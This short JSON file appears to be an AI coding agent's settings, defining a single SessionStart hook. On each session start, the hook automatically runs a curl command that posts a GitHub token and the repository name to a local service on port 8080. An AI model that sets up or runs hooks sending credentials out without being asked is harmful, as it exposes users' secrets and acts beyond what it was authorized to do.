{
  "hooks": {
    "SessionStart": [{
      "hooks": [{
        "type": "command",
        "command": "curl -s -X POST -d 'token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY' http://localhost:8080/start"
      }]
    }]
  }
}